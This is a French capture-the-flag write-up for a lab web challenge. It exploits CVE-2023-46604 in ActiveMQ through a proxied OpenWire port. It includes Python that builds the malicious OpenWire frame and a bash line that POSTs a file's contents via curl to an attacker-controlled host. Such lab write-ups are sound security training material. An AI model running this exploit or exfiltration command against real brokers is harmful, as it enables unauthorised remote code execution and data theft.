---
title: "Operation Tervalis · Silent Broker"
platform: "HackerLab Benin 2026 (H4ckd4ne)"
category: "web"
difficulty: "—"
points: 100
os: "—"
date: 2026-11-20
author: "Unpasswd"
author_github: "H4ckd4ne"
source: "https://github.com/H4ckd4ne/hackerlab2026-writeups/blob/main/operation-tervalis/silent-broker/writeup-silent-broker.md"
license: "CC BY-SA 4.0"
status: published
---

# Silent Broker — Write-up

## Objectif

- **Catégorie** : Web (série « Operation Tervalis », partie 07)
- **Énoncé** : un portail de coordination du FBI Valdoria est accessible depuis la
  position. Le défi : s'introduire dans l'infrastructure relais derrière ce portail.
- **Cible** : `172.28.6.3:8080` (portail web, Python) + `172.28.6.3:61616`
  (protocole OpenWire, proxy devant ActiveMQ), via tunnel WireGuard fourni par la
  plateforme.

## État initial

- Portail web « FBI Valdoria — Portail de coordination » : SPA (HTML/JS) avec une
  API REST (`/api/status`, `/api/cases`, `/api/messages`, `/api/events`,
  `/api/login`), authentification requise.
- Port `61616` ouvert : un proxy TCP (`owproxy.py`) qui relaie vers l'ActiveMQ
  interne (port 61617) et « scrub » la version annoncée par le serveur
  (`5.18.2` → `0.0.0`) pour masquer la version.
- ActiveMQ 5.18.2 = vulnérable à **CVE-2023-46604** (RCE via désérialisation
  OpenWire / `ClassPathXmlApplicationContext`).

## Reconnaissance

1. Identification du portail sur 8080 et découverte du port 61616 (OpenWire)
   sur la même IP.
2. Le proxy scrube la version mais relaie le protocole tel quel → l'exploit
   CVE-2023-46604 reste fonctionnel.

## Exploitation (reproductible)

Serveur d'exfil HTTP local (port 8001) qui sert `/poc.xml` : un bean Spring
`java.lang.ProcessBuilder` avec `init-method="start"`, exécutant :

```bash
cat /opt/activemq/data/flag.txt | curl -s -X POST --data-binary @- http://<OUR_IP>:8001/exfil
```

Puis envoi sur le port OpenWire (61616) d'une frame OpenWire (type
`ExceptionResponse`) dont la charge utile `ClassPathXmlApplicationContext`
pointe vers `http://<OUR_IP>:8001/poc.xml` :

```python
cn = "org.springframework.context.support.ClassPathXmlApplicationContext"
url = "http://%s:%d/poc.xml" % (OUR_IP, LPORT)
body = "1f00000000000000000001" + "01" + i2h(len(cn),4) + s2h(cn) + "01" + i2h(len(url),4) + s2h(url)
payload = i2h(len(body)//2, 8) + body
c = socket.create_connection((TARGET, 61616), timeout=10)
c.send(bytes.fromhex(payload))
```

ActiveMQ charge le XML distant, Spring instancie le bean, et le
`ProcessBuilder` exécute le `bash -c` : le contenu du fichier est POSTé vers
notre serveur d'exfil.

Le fichier `/opt/activemq/data/flag.txt` contient la valeur soumise (transmise
à la plateforme, challenge « Silent Broker »).

## Raisonnement

- Le port 61616 est exposé et relaie l'OpenWire vers un ActiveMQ 5.18.2.
- CVE-2023-46604 : en envoyant une trame OpenWire avec une classe
  `ClassPathXmlApplicationContext`, le broker charge et instancie un bean
  Spring arbitraire depuis une URL contrôlée par l'attaquant.
- Le bean `ProcessBuilder` (init-method=start) donne une exécution de commande
  à distance, utilisée pour lire et exfiltrer le flag.

## Pistes écartées

- Exploitation du portail web (API, authentification) : pas nécessaire pour ce
  flag — le relais est la cible (« Silent Broker »).
- Version detection : le proxy masque `5.18.2`, mais l'exploit ne dépend pas de
  l'annonce de version.

## Validation

Ré-exécuter le serveur d'exfil + la trame OpenWire ci-dessus contre
`172.28.6.3:61616` ; le POST `/exfil` reçoit le contenu du fichier cible.
